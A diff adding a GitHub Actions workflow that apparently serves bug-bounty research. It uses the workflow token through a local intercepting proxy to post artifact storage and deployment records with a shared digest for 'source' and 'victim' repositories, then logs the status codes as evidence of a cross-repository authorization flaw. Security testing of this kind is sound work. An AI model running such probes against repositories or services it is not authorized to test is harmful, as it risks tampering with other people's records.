@@ -1,0 +1,150 @@
+name: Artifact metadata shared-digest source matrix
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+  artifact-metadata: write
+
+jobs:
+  test-shared-source:
+    runs-on:
+      - self-hosted
+      - github2-artmeta-shared-source-20260729
+    steps:
+      - name: Prepare shared subject
+        id: fixture
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p subjects evidence
+          printf '%s' 'github2-artmeta-shared-collision-20260729-v1' > subjects/shared-collision.txt
+          printf 'digest=sha256:%s\n' \
+            "$(shasum -a 256 subjects/shared-collision.txt | cut -d ' ' -f 1)" \
+            >> "$GITHUB_OUTPUT"
+
+      - name: Attest shared source subject
+        id: attest
+        uses: actions/attest@v4
+        with:
+          subject-path: subjects/shared-collision.txt
+
+      - name: Test shared-digest repository resolution
+        shell: bash
+        env:
+          GH_TOKEN_VALUE: ${{ github.token }}
+          SHARED_DIGEST: ${{ steps.fixture.outputs.digest }}
+        run: |
+          set -euo pipefail
+          auth_cfg="$RUNNER_TEMP/github-api-auth.cfg"
+          umask 077
+          {
+            printf 'header = "Authorization: Bearer %s"\n' "$GH_TOKEN_VALUE"
+            printf 'header = "Accept: application/vnd.github+json"\n'
+            printf 'header = "X-GitHub-Api-Version: 2026-03-10"\n'
+            printf 'header = "X-Bug-Bounty: rez0"\n'
+            printf 'header = "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"\n'
+          } > "$auth_cfg"
+
+          api_post() {
+            local label="$1"
+            local route="$2"
+            local body="$3"
+            printf '%s\n' "$body" > "evidence/${label}.request.json"
+            curl -sS \
+              --proxy http://127.0.0.1:8080 \
+              --config "$auth_cfg" \
+              -X POST \
+              -H 'Content-Type: application/json' \
+              --data-binary "@evidence/${label}.request.json" \
+              -o "evidence/${label}.response.json" \
+              -w '%{http_code}\n' \
+              "$route" > "evidence/${label}.status"
+          }
+
+          storage_body() {
+            local label="$1"
+            local repository="$2"
+            jq -nc \
+              --arg label "$label" \
+              --arg digest "$SHARED_DIGEST" \
+              --arg repository "$repository" \
+              '{
+                name:$label,
+                version:"1.0.0",
+                digest:$digest,
+                artifact_url:("https://example.invalid/github2/" + $label),
+                registry_url:"https://example.invalid/",
+                repository:"github2-shared-registry",
+                status:"active",
+                github_repository:$repository,
+                return_records:true
+              }'
+          }
+
+          deployment_body() {
+            local label="$1"
+            local repository="$2"
+            jq -nc \
+              --arg label "$label" \
+              --arg digest "$SHARED_DIGEST" \
+              --arg repository "$repository" \
+              '{
+                name:$label,
+                version:"1.0.0",
+                digest:$digest,
+                status:"deployed",
+                logical_environment:"github2-prod",
+                physical_environment:"github2-east",
+                cluster:("github2-" + $label),
+                deployment_name:$label,
+                tags:{marker:$label},
+                github_repository:$repository,
+                return_records:true
+              }'
+          }
+
+          storage_route='https://api.github.com/orgs/jtestappomni/artifacts/metadata/storage-record'
+          deployment_route='https://api.github.com/orgs/jtestappomni/artifacts/metadata/deployment-record'
+
+          api_post shared-storage-source-field "$storage_route" \
+            "$(storage_body shared-storage-source-field github2-artmeta-source-20260729)"
+          api_post shared-storage-victim-field "$storage_route" \
+            "$(storage_body shared-storage-victim-field github2-artmeta-victim-20260729)"
+          api_post shared-deployment-source-field "$deployment_route" \
+            "$(deployment_body shared-deployment-source-field github2-artmeta-source-20260729)"
+          api_post shared-deployment-victim-field "$deployment_route" \
+            "$(deployment_body shared-deployment-victim-field github2-artmeta-victim-20260729)"
+
+          jq -n \
+            --arg repository '${{ github.repository }}' \
+            --arg digest "$SHARED_DIGEST" \
+            --arg attestation_id '${{ steps.attest.outputs.attestation-id }}' \
+            --arg attestation_url '${{ steps.attest.outputs.attestation-url }}' \
+            '{
+              repository:$repository,
+              digest:$digest,
+              attestation_id:$attestation_id,
+              attestation_url:$attestation_url
+            }' > evidence/shared-source-fixture.json
+
+          {
+            printf 'label\tstatus\n'
+            for status_file in evidence/*.status
+            do
+              label="$(basename "$status_file" .status)"
+              printf '%s\t%s\n' "$label" "$(tr -d '\r\n' < "$status_file")"
+            done
+          } > evidence/status-matrix.tsv
+          rm -f "$auth_cfg"
+
+      - name: Upload shared source matrix
+        uses: actions/upload-artifact@v4
+        with:
+          name: artifact-metadata-shared-source
+          path: evidence
+          if-no-files-found: error
+          retention-days: 7
